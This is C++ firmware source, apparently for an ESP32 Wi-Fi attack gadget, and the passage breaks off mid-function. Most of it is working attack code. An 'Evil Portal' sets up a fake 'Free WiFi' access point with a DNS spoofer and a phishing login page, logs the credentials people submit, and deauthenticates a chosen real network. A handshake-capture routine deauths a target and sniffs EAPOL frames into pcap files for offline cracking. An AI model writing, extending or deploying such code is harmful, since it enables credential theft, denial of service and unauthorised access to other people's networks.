// ====================================================================
//  STA connect (unchanged)
// ====================================================================
static const char* WIFI_CREDS_PATH = "/wifi_creds.csv";

struct WifiCred { String ssid; String pass; };

static std::vector<WifiCred> loadSavedCreds() {
  std::vector<WifiCred> out;
  String content;
  if (!sdReadFile(WIFI_CREDS_PATH, content)) return out;
  int start = 0, len = content.length();
  while (start < len) {
    int nl = content.indexOf('\n', start);
    String line = (nl >= 0) ? content.substring(start, nl) : content.substring(start);
    start = (nl >= 0) ? nl + 1 : len;
    line.trim();
    if (line.length() == 0) continue;
    int c = line.indexOf(',');
    if (c < 0) continue;
    WifiCred cred;
    cred.ssid = line.substring(0, c);
    cred.pass = line.substring(c + 1);
    out.push_back(cred);
  }
  return out;
}

std::vector<String> wifiListSavedNetworks() {
  std::vector<String> out;
  auto creds = loadSavedCreds();
  for (auto& c : creds) out.push_back(c.ssid);
  if (out.empty()) out.push_back("(none - add /wifi_creds.csv)");
  return out;
}

bool wifiConnectSaved(int index, unsigned long timeoutMs) {
  auto creds = loadSavedCreds();
  if (index < 0 || index >= (int)creds.size()) return false;
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  WiFi.begin(creds[index].ssid.c_str(), creds[index].pass.c_str());
  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < timeoutMs) {
    delay(100);
  }
  return WiFi.status() == WL_CONNECTED;
}

bool wifiIsConnected() { return WiFi.status() == WL_CONNECTED; }
String wifiGetLocalIpStr() { return WiFi.localIP().toString(); }

// ====================================================================
//  Scan Hosts (unchanged)
// ====================================================================
std::vector<HostHit> wifiScanHosts(uint16_t port, uint16_t perBatchTimeoutMs) {
  std::vector<HostHit> hits;
  if (WiFi.status() != WL_CONNECTED) return hits;

  uint32_t localU = ntohl((uint32_t)WiFi.localIP());
  uint32_t maskU  = ntohl((uint32_t)WiFi.subnetMask());
  uint32_t netU   = localU & maskU;
  uint32_t bcastU = netU | (~maskU);

  std::vector<uint32_t> hostIPs;
  for (uint32_t ipU = netU + 1; ipU < bcastU && hostIPs.size() < 512; ipU++) {
    if (ipU != localU) hostIPs.push_back(ipU);
  }

  const int BATCH = 8;
  for (size_t i = 0; i < hostIPs.size(); i += BATCH) {
    int n = (int)min((size_t)BATCH, hostIPs.size() - i);
    int fds[BATCH];
    for (int b = 0; b < n; b++) {
      int fd = lwip_socket(AF_INET, SOCK_STREAM, 0);
      fds[b] = fd;
      if (fd < 0) continue;
      int flags = lwip_fcntl(fd, F_GETFL, 0);
      lwip_fcntl(fd, F_SETFL, flags | O_NONBLOCK);
      sockaddr_in addr{};
      addr.sin_family = AF_INET;
      addr.sin_port = htons(port);
      addr.sin_addr.s_addr = htonl(hostIPs[i + b]);
      lwip_connect(fd, (sockaddr*)&addr, sizeof(addr));
    }
    unsigned long batchStart = millis();
    while (millis() - batchStart < perBatchTimeoutMs) {
      fd_set wfds; FD_ZERO(&wfds);
      int maxfd = -1;
      bool any = false;
      for (int b = 0; b < n; b++) {
        if (fds[b] >= 0) { FD_SET(fds[b], &wfds); if (fds[b] > maxfd) maxfd = fds[b]; any = true; }
      }
      if (!any) break;
      timeval tv{0, 25000};
      lwip_select(maxfd + 1, NULL, &wfds, NULL, &tv);
      for (int b = 0; b < n; b++) {
        if (fds[b] >= 0 && FD_ISSET(fds[b], &wfds)) {
          int err = 0; socklen_t elen = sizeof(err);
          lwip_getsockopt(fds[b], SOL_SOCKET, SO_ERROR, &err, &elen);
          if (err == 0) {
            HostHit h; h.ip = hostIPs[i + b]; h.alive = true;
            hits.push_back(h);
          }
          lwip_close(fds[b]);
          fds[b] = -1;
        }
      }
    }
    for (int b = 0; b < n; b++) if (fds[b] >= 0) lwip_close(fds[b]);
  }
  return hits;
}

static String ipU32ToStr(uint32_t ipU) {
  return IPAddress(htonl(ipU)).toString();
}

// ====================================================================
//  EVIL PORTAL (unchanged)
// ====================================================================
// ---- State ----
static String g_evilHtmlFile = "/evil_portal/default.html";
static std::vector<String> g_htmlFiles;
static int g_htmlSelIndex = 0;

// Target AP for deauth
static String g_targetSsid = "";
static String g_targetBssid = "";
static uint8_t g_targetChannel = 1;
static bool g_targetSelected = false;

// Credentials & UI
struct CapturedCred {
    unsigned long timestamp;
    String user;
    String pass;
};
static std::vector<CapturedCred> g_capturedCreds;
static ScrollList g_credList;
static bool g_needRedraw = false;

static WiFiServer portalServer(80);
static bool portalRunning = false;
static String portalHtmlCache;
static const char* EVIL_LOG_PATH = "/evil_portal_log.txt";

// ---- Built-in fallback page (same as before) ----
static String buildDefaultPortalPage() {
    return R"rawliteral(
<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<style>
body{background:#f2f2f2;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.2);width:300px;}
h2{text-align:center;color:#333;}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:10px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;}
button:hover{background:#45a049;}
</style>
</head>
<body>
<div class="card">
<h2>Wi-Fi Network Login</h2>
<form method="POST" action="/login">
<label>Username</label><input type="text" name="user" placeholder="Enter your username">
<label>Password</label><input type="password" name="pass" placeholder="Enter your password">
<button type="submit">Connect</button>
</form>
<p style="font-size:12px;color:#888;text-align:center;">This network requires authentication.</p>
</div>
</body>
</html>
)rawliteral";
}

static String getPortalPage() {
    String content;
    if (sdIsMounted() && sdReadFile(g_evilHtmlFile.c_str(), content) && content.length() > 0) {
        return content;
    }
    return buildDefaultPortalPage();
}

// ---- DNS spoofer (unchanged) ----
static void portalDNSServerTask() {
    static WiFiUDP dnsUdp;
    static bool dnsStarted = false;
    if (!dnsStarted) {
        dnsUdp.begin(53);
        dnsStarted = true;
    }
    int packetSize = dnsUdp.parsePacket();
    if (!packetSize) return;
    uint8_t buffer[512];
    if (packetSize > (int)sizeof(buffer)) {
        dnsUdp.flush();
        return;
    }
    int readLen = dnsUdp.read(buffer, packetSize);
    if (readLen < 12) return;
    uint16_t qdcount = (buffer[4] << 8) | buffer[5];
    if (qdcount == 0) return;
    buffer[2] = 0x81;
    buffer[3] = 0x80;
    buffer[6] = 0x00;
    buffer[7] = 0x01;
    uint16_t pos = 12;
    while (pos < packetSize && buffer[pos] != 0) pos++;
    pos++;
    pos += 4;
    if (pos + 16 > sizeof(buffer)) return;
    buffer[pos++] = 0xc0;
    buffer[pos++] = 0x0c;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x3c;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x04;
    IPAddress ip = WiFi.softAPIP();
    buffer[pos++] = ip[0];
    buffer[pos++] = ip[1];
    buffer[pos++] = ip[2];
    buffer[pos++] = ip[3];
    dnsUdp.beginPacket(dnsUdp.remoteIP(), dnsUdp.remotePort());
    dnsUdp.write(buffer, pos);
    dnsUdp.endPacket();
}

// ---- HTTP client handler (unchanged) ----
static void handlePortalClient(WiFiClient client) {
    String request = "";
    while (client.connected() && !client.available()) delay(1);
    if (!client.available()) return;
    String line = client.readStringUntil('\n');
    line.trim();
    if (line.length() == 0) return;
    String method = line.substring(0, line.indexOf(' '));
    String path = line.substring(line.indexOf(' ') + 1);
    path = path.substring(0, path.indexOf(' '));
    while (client.available()) {
        String h = client.readStringUntil('\n');
        if (h.length() <= 1) break;
    }

    if (method == "POST" && path == "/login") {
        String body = "";
        while (client.available()) {
            char c = client.read();
            if (c == '\n') break;
            body += c;
        }
        String user = "", pass = "";
        int u = body.indexOf("user=");
        if (u >= 0) {
            int end = body.indexOf('&', u);
            if (end < 0) end = body.length();
            user = body.substring(u + 5, end);
        }
        int p = body.indexOf("pass=");
        if (p >= 0) {
            int end = body.indexOf('&', p);
            if (end < 0) end = body.length();
            pass = body.substring(p + 5, end);
        }
        user.replace('+', ' ');
        pass.replace('+', ' ');
        user.replace("%20", " ");
        pass.replace("%20", " ");

        CapturedCred cred;
        cred.timestamp = millis();
        cred.user = user;
        cred.pass = pass;
        g_capturedCreds.push_back(cred);
        if (g_capturedCreds.size() > 100) {
            g_capturedCreds.erase(g_capturedCreds.begin());
        }
        g_needRedraw = true;

        if (sdIsMounted()) {
            String logLine = "Time: " + String(millis()) + " User: " + user + " Pass: " + pass;
            sdAppendLine(EVIL_LOG_PATH, logLine);
        }

        client.println("HTTP/1.1 200 OK");
        client.println("Content-Type: text/html");
        client.println("Connection: close");
        client.println();
        client.println("<html><body><h2>Thank you! You are now connected.</h2></body></html>");
        client.stop();
        return;
    }

    // Serve the portal page
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html");
    client.println("Connection: close");
    client.println();
    client.print(portalHtmlCache);
    client.stop();
}

// ---- Evil Portal main functions ----
void wifiEvilPortalStart() {
    if (portalRunning) return;
    portalHtmlCache = getPortalPage();
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Free WiFi", nullptr, 1, 0, 1);
    portalServer.begin();
    portalRunning = true;
    if (sdIsMounted()) {
        sdAppendLine(EVIL_LOG_PATH, "--- Evil Portal started ---");
    }
    g_needRedraw = true;

    // Start deauth attack on selected target (if any)
    if (g_targetSelected && g_targetBssid.length() > 0) {
        wifiDeauthSetTarget(g_targetSsid, g_targetBssid, g_targetChannel);
        wifiDeauthStart();
    }
}

void wifiEvilPortalStop() {
    if (!portalRunning) return;
    portalServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    portalRunning = false;
    // Stop deauth
    wifiDeauthStop();
    if (sdIsMounted()) {
        sdAppendLine(EVIL_LOG_PATH, "--- Evil Portal stopped ---");
    }
    g_needRedraw = true;
}

bool wifiEvilPortalIsRunning() { return portalRunning; }

void wifiEvilPortalTick() {
    if (!portalRunning) return;
    portalDNSServerTask();
    WiFiClient client = portalServer.available();
    if (client) {
        handlePortalClient(client);
    }
    // Also keep deauth running
    wifiDeauthTick();
}

// ---- UI drawing ----
static void drawEvilPortalScreen() {
    const uint16_t accent = portalRunning ? UI_ACCENT_RED : UI_ACCENT_CYAN;
    beginScreen("Evil Portal", accent);

    int y = displayHeaderHeight() + 22;
    int lineH = 16;

    // Status shown as a pill badge instead of plain text, matching the
    // status badges used on every other redesigned screen. It gets its
    // own row just under the header so it never collides with the text
    // lines below.
    drawStatusPill(tft.width() - 8, displayHeaderHeight() + 4, portalRunning ? "RUNNING" : "STOPPED", accent);
    tft.setTextColor(displayColorFg(), displayColorBg());
    tft.setCursor(8, y);
    tft.print("AP: Free WiFi");
    y += lineH;

    // HTML file
    tft.setTextColor(displayColorFgDim(), displayColorBg());
    tft.setCursor(8, y);
    tft.print("HTML: " + g_evilHtmlFile);
    y += lineH;

    // Target AP (if selected) - green once locked in, red warning if not.
    if (g_targetSelected) {
        tft.setTextColor(UI_ACCENT_GREEN, displayColorBg());
        tft.setCursor(8, y);
        tft.print("Target: " + g_targetSsid + " ch" + String(g_targetChannel));
        y += lineH;
    } else {
        tft.setTextColor(UI_ACCENT_RED, displayColorBg());
        tft.setCursor(8, y);
        tft.print("No target AP selected!");
        y += lineH;
    }

    if (!portalRunning) {
        // ---- File picker ----
        if (g_htmlFiles.empty() && sdIsMounted()) {
            auto all = sdListDir("/evil_portal/");
            for (auto &f : all) {
                if (!f.endsWith("/")) {
                    String low = f; low.toLowerCase();
                    if (low.endsWith(".html") || low.endsWith(".htm")) {
                        g_htmlFiles.push_back("/evil_portal/" + f);
                    }
                }
            }
            if (g_htmlSelIndex >= (int)g_htmlFiles.size()) g_htmlSelIndex = 0;
            if (!g_htmlFiles.empty()) {
                bool found = false;
                for (auto &f : g_htmlFiles) {
                    if (f == g_evilHtmlFile) { found = true; break; }
                }
                if (!found) {
                    g_evilHtmlFile = g_htmlFiles[0];
                    g_htmlSelIndex = 0;
                }
            }
        }

        y += 2;
        tft.setTextColor(displayColorFg(), displayColorBg());
        if (g_htmlFiles.empty()) {
            tft.setCursor(8, y);
            tft.print("No .html files in /evil_portal/");
        } else {
            tft.setCursor(8, y);
            tft.print("Select HTML (UP/DN, OK to choose):");
            y += lineH;
            int start = 0, end = g_htmlFiles.size();
            if (end - start > 6) {
                start = g_htmlSelIndex - 3;
                if (start < 0) start = 0;
                if (start + 6 > (int)g_htmlFiles.size()) start = g_htmlFiles.size() - 6;
                end = start + 6;
            }
            for (int i = start; i < end; i++) {
                bool sel = (i == g_htmlSelIndex);
                if (sel) {
                    tft.fillRect(8, y - 2, tft.width() - 16, lineH, displayColorSelectBg());
                    tft.setTextColor(displayColorSelectFg(), displayColorSelectBg());
                } else {
                    tft.setTextColor(displayColorFg(), displayColorBg());
                }
                String name = g_htmlFiles[i];
                int slash = name.lastIndexOf('/');
                if (slash >= 0) name = name.substring(slash + 1);
                tft.setCursor(12, y);
                tft.print(name);
                y += lineH;
            }
            // Show AP selection hint if file selected
            if (g_htmlSelIndex < (int)g_htmlFiles.size()) {
                tft.setTextColor(displayColorFgDim(), displayColorBg());
                tft.setCursor(8, y);
                tft.print("OK to select, then choose AP");
                y += lineH;
            }
        }
        drawFooter("UP/DN choose  OK select  LEFT/RIGHT reload  BACK exit");
    } else {
        // ---- Running: show credentials + deauth stats ----
        y += 2;
        int listTop = y;
        int footerH = 14;
        int availH = tft.height() - listTop - footerH;
        int rows = availH / lineH;
        if (rows < 1) rows = 1;

        int count = g_capturedCreds.size();
        if (count == 0) {
            tft.setTextColor(displayColorFgDim(), displayColorBg());
            tft.setCursor(8, listTop);
            tft.print("No credentials captured yet.");
        } else {
            if (g_credList.selRow < g_credList.topRow) g_credList.topRow = g_credList.selRow;
            if (g_credList.selRow >= g_credList.topRow + rows) g_credList.topRow = g_credList.selRow - rows + 1;
            if (g_credList.topRow < 0) g_credList.topRow = 0;
            if (g_credList.topRow > count - rows) g_credList.topRow = count - rows;

            for (int i = g_credList.topRow; i < min(count, g_credList.topRow + rows); i++) {
                int yPos = listTop + (i - g_credList.topRow) * lineH;
                bool selected = (i == g_credList.selRow);
                if (selected) {
                    tft.fillRect(0, yPos - 2, tft.width(), lineH, displayColorSelectBg());
                    tft.setTextColor(displayColorSelectFg(), displayColorSelectBg());
                } else {
                    // Captured credentials are the whole point of this
                    // screen while running, so they get the success accent
                    // instead of blending into the plain foreground text.
                    tft.setTextColor(UI_ACCENT_GREEN, displayColorBg());
                }
                String credLine = g_capturedCreds[i].user + " : " + g_capturedCreds[i].pass;
                int maxLen = (tft.width() - 16) / 6;
                if ((int)credLine.length() > maxLen) credLine = credLine.substring(0, maxLen - 3) + "...";
                tft.setCursor(8, yPos);
                tft.print(credLine);
            }

            if (count > rows) {
                int trackX = tft.width() - 4;
                int trackH = rows * lineH;
                tft.drawRect(trackX, listTop - 2, 3, trackH, displayColorFgDim());
                int thumbH = max(8, trackH * rows / count);
                int thumbY = listTop - 2 + (trackH - thumbH) * g_credList.topRow / max(1, count - rows);
                tft.fillRect(trackX, thumbY, 3, thumbH, displayColorFg());
            }
        }
        // Deauth frames sent
        tft.setTextColor(UI_ACCENT_AMBER, displayColorBg());
        tft.setCursor(8, tft.height() - 28);
        tft.print("Deauth frames sent: " + String(wifiDeauthFramesSent()));
        drawFooter("UP/DN scroll  OK stop  BACK exit");
    }
}

// ---- UI entry / event handlers ----
enum EvilPortalPhase {
    EVIL_PHASE_FILE,
    EVIL_PHASE_AP,
    EVIL_PHASE_RUNNING
};
static EvilPortalPhase g_evilPhase = EVIL_PHASE_FILE;
static std::vector<WifiNet> g_apList;
static ScrollList g_apListScroll;
static String g_apListHint = "UP/DN select  OK choose AP  BACK exit";

void wifiEnterEvilPortal() {
    // Reset everything
    if (portalRunning) wifiEvilPortalStop();
    g_capturedCreds.clear();
    g_credList.reset();
    g_htmlFiles.clear();
    g_htmlSelIndex = 0;
    g_targetSelected = false;
    g_targetSsid = "";
    g_targetBssid = "";
    g_targetChannel = 1;
    g_evilPhase = EVIL_PHASE_FILE;
    g_apList.clear();
    g_apListScroll.reset();
    g_needRedraw = false;

    // Load HTML files from /evil_portal/
    if (sdIsMounted()) {
        auto all = sdListDir("/evil_portal/");
        for (auto &f : all) {
            if (!f.endsWith("/")) {
                String low = f; low.toLowerCase();
                if (low.endsWith(".html") || low.endsWith(".htm")) {
                    g_htmlFiles.push_back("/evil_portal/" + f);
                }
            }
        }
    }
    if (g_htmlFiles.empty()) {
        // Create default fallback if no files
        g_evilHtmlFile = "/evil_portal/default.html";
        sdWriteFile(g_evilHtmlFile.c_str(), buildDefaultPortalPage());
        g_htmlFiles.push_back(g_evilHtmlFile);
    }
    g_htmlSelIndex = 0;
    g_evilHtmlFile = g_htmlFiles[0];
    drawEvilPortalScreen();
}

void wifiHandleEvilPortalEvent(int evt) {
    // If portal is running, handle running state
    if (portalRunning) {
        if (evt == EVT_UP) {
            g_credList.up();
            g_needRedraw = true;
        }
        if (evt == EVT_DOWN) {
            g_credList.down(g_capturedCreds.size());
            g_needRedraw = true;
        }
        if (evt == EVT_OK) {
            wifiEvilPortalStop();
            g_needRedraw = true;
            // After stopping, we stay in file selection phase (not running)
            g_evilPhase = EVIL_PHASE_FILE;
        }
        wifiEvilPortalTick();
        if (g_needRedraw) {
            drawEvilPortalScreen();
            g_needRedraw = false;
        }
        return;
    }

    // --- Not running: handle phases ---

    if (g_evilPhase == EVIL_PHASE_FILE) {
        // File selection
        if (evt == EVT_UP) {
            if (!g_htmlFiles.empty()) {
                g_htmlSelIndex = (g_htmlSelIndex - 1 + g_htmlFiles.size()) % g_htmlFiles.size();
                g_needRedraw = true;
            }
        }
        if (evt == EVT_DOWN) {
            if (!g_htmlFiles.empty()) {
                g_htmlSelIndex = (g_htmlSelIndex + 1) % g_htmlFiles.size();
                g_needRedraw = true;
            }
        }
        if (evt == EVT_OK) {
            if (!g_htmlFiles.empty() && g_htmlSelIndex < (int)g_htmlFiles.size()) {
                g_evilHtmlFile = g_htmlFiles[g_htmlSelIndex];
                // Switch to AP selection phase
                g_evilPhase = EVIL_PHASE_AP;
                // Perform Wi-Fi scan
                g_apList = wifiScanRaw();
                g_apListScroll.reset();
                drawEvilPortalScreen(); // will show AP list
                g_needRedraw = false;
            }
        }
        if (evt == EVT_LEFT || evt == EVT_RIGHT) {
            // Reload HTML list from SD
            g_htmlFiles.clear();
            if (sdIsMounted()) {
                auto all = sdListDir("/evil_portal/");
                for (auto &f : all) {
                    if (!f.endsWith("/")) {
                        String low = f; low.toLowerCase();
                        if (low.endsWith(".html") || low.endsWith(".htm")) {
                            g_htmlFiles.push_back("/evil_portal/" + f);
                        }
                    }
                }
            }
            if (g_htmlFiles.empty()) {
                g_evilHtmlFile = "/evil_portal/default.html";
                sdWriteFile(g_evilHtmlFile.c_str(), buildDefaultPortalPage());
                g_htmlFiles.push_back(g_evilHtmlFile);
            }
            g_htmlSelIndex = 0;
            g_evilHtmlFile = g_htmlFiles[0];
            g_needRedraw = true;
            displayShowMessage("Evil Portal", "HTML list reloaded");
            delay(300);
        }
        if (g_needRedraw) {
            drawEvilPortalScreen();
            g_needRedraw = false;
        }
        return;
    }

    if (g_evilPhase == EVIL_PHASE_AP) {
        // AP selection
        const char* footer = "UP/DN select  OK choose AP  BACK to file";
        if (evt == EVT_UP) {
            g_apListScroll.up();
            g_needRedraw = true;
        }
        if (evt == EVT_DOWN) {
            g_apListScroll.down((int)g_apList.size());
            g_needRedraw = true;
        }
        if (evt == EVT_OK) {
            int i = g_apListScroll.selRow;
            if (i >= 0 && i < (int)g_apList.size()) {
                const WifiNet& n = g_apList[i];
                g_targetSsid = n.ssid;
                g_targetBssid = n.bssid;
                g_targetChannel = n.channel;
                g_targetSelected = true;
                // Now start the portal + deauth
                wifiEvilPortalStart();
                g_evilPhase = EVIL_PHASE_RUNNING;
                g_needRedraw = true;
            } else {
                displayShowMessage("Evil Portal", "No AP selected");
                delay(500);
            }
        }
        if (evt == EVT_BACK) {
            g_evilPhase = EVIL_PHASE_FILE;
            g_needRedraw = true;
        }
        if (g_needRedraw) {
            // Draw AP list
            String title = "Select target AP (" + String(g_apList.size()) + ")";
            beginScreen(title.c_str());
            int top = displayHeaderHeight() + 4;
            const int footerH = 14;
            const int rowH = 18;
            if (g_apList.empty()) {
                tft.setCursor(8, top);
                tft.print("No networks found");
            } else {
                drawScrollListBody(g_apListScroll, (int)g_apList.size(), top, footerH, rowH, /*selectable=*/true,
                    [&](int i, int y, bool selected) {
                        const WifiNet& n = g_apList[i];
                        if (selected) {
                            tft.fillRect(0, y - 2, tft.width(), rowH, displayColorSelectBg());
                            tft.setTextColor(displayColorSelectFg(), displayColorSelectBg());
                        } else {
                            tft.setTextColor(displayColorFg(), displayColorBg());
                        }
                        tft.setTextSize(1);
                        tft.setCursor(8, y);
                        tft.print(elideToWidth(n.ssid, 24) + "  ch" + String(n.channel) + " " + String(n.rssi) + "dBm");
                    });
            }
            drawFooter(footer);
            g_needRedraw = false;
        }
        return;
    }
}

//  Handshake Capture (promiscuous mode + automatic deauth)

#define HC_RING_SIZE 256   // larger buffer
struct EapolFrame {
  unsigned long ts;
  uint8_t data[256];
  uint16_t len;
};
static EapolFrame hcRing[HC_RING_SIZE];
static volatile int hcHead = 0, hcTail = 0;
static volatile uint32_t hcDropped = 0;
static uint32_t hcFrameCount = 0;
static bool hcRunning = false, hcComplete = false, hcFileReady = false;
static String hcResultPath, hcStatus = "Idle";
static uint8_t hcBssid[6];
static bool hcHasBssid = false;

// PCAP header (same as before)
static const uint8_t PCAP_GLOBAL_HEADER[] = { /* ... */ };

static void IRAM_ATTR hcSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  (void)type;
  if (!hcRunning) return;
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 24) return;

  const uint8_t* p = pkt->payload;
  uint8_t fc0 = p[0];
  uint8_t frameType = (fc0 >> 2) & 0x03;
  if (frameType != 0x02) return; // data frames only

  // Check EAPOL (LLC/SNAP header)
  if (len < 24 + 8) return;
  if (p[24] != 0xAA || p[25] != 0xAA || p[26] != 0x03 || p[27] != 0x00 ||
      p[28] != 0x00 || p[29] != 0x00 || p[30] != 0x88 || p[31] != 0x8E)
    return;

  // Optional BSSID filter
  if (hcHasBssid) {
    uint8_t addr1[6], addr2[6], addr3[6];
    memcpy(addr1, p + 4, 6);
    memcpy(addr2, p + 10, 6);
    memcpy(addr3, p + 16, 6);
    if (memcmp(addr1, hcBssid, 6) && memcmp(addr2, hcBssid, 6) && memcmp(addr3, hcBssid, 6))
      return;
  }

  int next = (hcHead + 1) % HC_RING_SIZE;
  if (next == hcTail) { hcDropped++; return; }
  EapolFrame& f = hcRing[hcHead];
  f.ts = millis();
  f.len = len > sizeof(f.data) ? sizeof(f.data) : len;
  memcpy(f.data, p, f.len);
  hcHead = next;
  hcFrameCount++;
}

// ---- Public API ----
void wifiHandshakeStartCapture(const String& bssidStr, uint8_t channel, const String& ssid) {
  // Stop any ongoing WiFi activities
  wifiStopPacketMonitor();
  wifiBeaconStop();
  Deauth::stop(); // stop any previous deauth

  // Reset state
  hcRunning = false;
  hcComplete = false;
  hcResultPath = "";
  hcStatus = "Starting...";
  hcFrameCount = 0;
  hcDropped = 0;
  hcFileReady = false;
  hcHead = hcTail = 0;

  hcHasBssid = parseMac(bssidStr, hcBssid);
  // store ssid for deauth target
  String targetSsid = ssid;

  // === Start deauth attack ===
  Deauth::setTarget(ssid, bssidStr, channel);
  Deauth::start();

  // === Set up promiscuous sniffer ===
  wifiEnsureStaMode();
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Allow all frame types (especially data)
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
  esp_wifi_set_promiscuous_filter(&filter);

  esp_wifi_set_promiscuous_rx_cb(&hcSnifferCallback);
  esp_wifi_set_promiscuous(true);

  hcRunning = true;
  hcStatus = "Capturing + deauthing...";
}

void wifiHandshakeStopCapture() {
  if (!hcRunning) return;
  hcRunning = false;
  esp_wifi_set_promiscuous(false);
  Deauth::stop();
  hcStatus = "Stopped";
}

bool wifiHandshakeIsRunning() { return hcRunning; }
bool wifiHandshakeIsComplete() { return hcComplete; }
String wifiHandshakeGetResultPath() { return hcResultPath; }
String wifiHandshakeGetStatus() { return hcStatus; }

void wifiHandshakeTick() {
  // Keep deauth running
  Deauth::tick();

  if (!hcRunning) return;

  // Process frames from ring buffer
  while (hcTail != hcHead) {
    if (!hcFileReady) {
      String path = "/handshakes/capture_" + String(millis()) + ".pcap";
      hcResultPath = path;
      if (sdIsMounted()) {
        sdWriteFile(path.c_str(), PCAP_GLOBAL_HEADER, sizeof(PCAP_GLOBAL_HEADER));
        hcFileReady = true;
      } else {
        hcStatus = "SD error";
        wifiHandshakeStopCapture();
        return;
      }
    }

    EapolFrame& f = hcRing[hcTail];
    // Build PCAP packet header (same as before)
    uint8_t pcapHdr[16];
    uint32_t ts_sec = f.ts / 1000;
    uint32_t ts_usec = (f.ts % 1000) * 1000;
    pcapHdr[0] = ts_sec & 0xFF; pcapHdr[1] = (ts_sec >> 8) & 0xFF;
    pcapHdr[2] = (ts_sec >> 16) & 0xFF; pcapHdr[3] = (ts_sec >> 24) & 0xFF;
    pcapHdr[4] = ts_usec & 0xFF; pcapHdr[5] = (ts_usec >> 8) & 0xFF;
    pcapHdr[6] = (ts_usec >> 16) & 0xFF; pcapHdr[7] = (ts_usec >> 24) & 0xFF;
    uint32_t incl_len = f.len; uint32_t orig_len = f.len;
    pcapHdr[8] = incl_len & 0xFF; pcapHdr[9] = (incl_len >> 8) & 0xFF;
    pcapHdr[10] = (incl_len >> 16) & 0xFF; pcapHdr[11] = (incl_len >> 24) & 0xFF;
    pcapHdr[12] = orig_len & 0xFF; pcapHdr[13] = (orig_len >> 8) & 0xFF;
    pcapHdr[14] = (orig_len >> 16) & 0xFF; pcapHdr[15] = (orig_len >> 24) & 0xFF;

    sdAppendFile(hcResultPath.c_str(), pcapHdr, 16);
    sdAppendFile(hcResultPath.c_str(), f.data, f.len);

    hcTail = (hcTail + 1) % HC_RING_SIZE;
  }

  // Auto‑stop after capturing enough frames (e.g., 50)
  if (hcFrameCount > 50 && hcFileReady) {
    hcRunning = false;
    esp_wifi_set_promiscuous(false);
    Deauth::stop();
    hcComplete = true;
    hcStatus = "Captured " + String(hcFrameCount) + " EAPOL frames";
  }
}

// ---- Handshake UI ----
static std::vector<WifiNet> handshakePickResults;
static ScrollList handshakePickList;
static String handshakePickSsid, handshakePickBssid;
static uint8_t handshakePickChannel = 1;
static RedrawTimer handshakeCaptureRedraw;

void wifiEnterHandshakeMenu() {
  handshakePickResults = wifiScanRaw();
  handshakePickList.reset();
  drawNetworkListScreen("Handshake Target", handshakePickList, handshakePickResults,
                        "UP/DN select   OK start   BACK exit");
}

void wifiHandleHandshakeMenuEvent(int evt) {
  const char* footer = "UP/DN select   OK start   BACK exit";
  if (evt == EVT_UP) {
    handshakePickList.up();
    drawNetworkListScreen("Handshake Target", handshakePickList, handshakePickResults, footer);
  } else if (evt == EVT_DOWN) {
    handshakePickList.down((int)handshakePickResults.size());
    drawNetworkListScreen("Handshake Target", handshakePickList, handshakePickResults, footer);
  } else if (evt == EVT_OK) {
    int i = handshakePickList.selRow;
    if (i >= 0 && i < (int)handshakePickResults.size()) {
      const WifiNet& n = handshakePickResults[i];
      handshakePickSsid = n.ssid;
      handshakePickBssid = n.bssid;
      handshakePickChannel = n.channel;
      enterState(STATE_WIFI_HANDSHAKE_CAPTURE);
    }
  }
}

static void drawHandshakeCaptureScreen() {
  bool running = wifiHandshakeIsRunning();
  const uint16_t accent = running ? UI_ACCENT_GREEN : UI_ACCENT_AMBER;
  beginScreen("Handshake Capture", accent, /*pulse=*/running);
  int y = displayHeaderHeight() + 24;
  // Pill gets its own row just under the header, so it never collides
  // with the Target/BSSID text lines below.
  drawStatusPill(tft.width() - 8, displayHeaderHeight() + 4, running ? "CAPTURING" : "STOPPED", accent, /*pulse=*/running);
  tft.setCursor(8, y);
  tft.print("Target: " + handshakePickSsid);
  y += 16;
  tft.setCursor(8, y);
  tft.print("BSSID: " + handshakePickBssid);
  y += 16;
  tft.setCursor(8, y);
  tft.print("Status: " + wifiHandshakeGetStatus());
  y += 24;
  tft.setTextColor(accent, displayColorBg());
  tft.setCursor(8, y);
  tft.print(running ? "Capturing... (OK to stop)" : "Stopped (OK to resume)");
  tft.setTextColor(displayColorFg(), displayColorBg());
  drawFooter("BACK to stop and exit");
}

void wifiEnterHandshakeCapture() {
  wifiHandshakeStartCapture(handshakePickBssid, handshakePickChannel, handshakePickSsid);
  handshakeCaptureRedraw.reset();
  drawHandshakeCaptureScreen();
}

void wifiHandleHandshakeCaptureEvent(int evt) {
  if (evt == EVT_OK) {
    if (wifiHandshakeIsRunning()) {
      wifiHandshakeStopCapture();
    } else {
      wifiHandshakeStartCapture(handshakePickBssid, handshakePickChannel, handshakePickSsid);
    }
    drawHandshakeCaptureScreen();
  }
  wifiHandshakeTick();
  if (wifiHandshakeIsComplete()) {
    enterState(STATE_WIFI_HANDSHAKE_RESULT);
    return;
  }
  if (handshakeCaptureRedraw.due(500)) {
    drawHandshakeCaptureScreen();
  }
}

void wifiEnterHandshakeResult() {
  String msg;
  if (wifiHandshakeIsComplete()) {
    msg = "Captured!\nSaved to:\n" + wifiHandshakeGetResultPath();
  } else {
    msg = "Capture incomplete or failed.";
  }
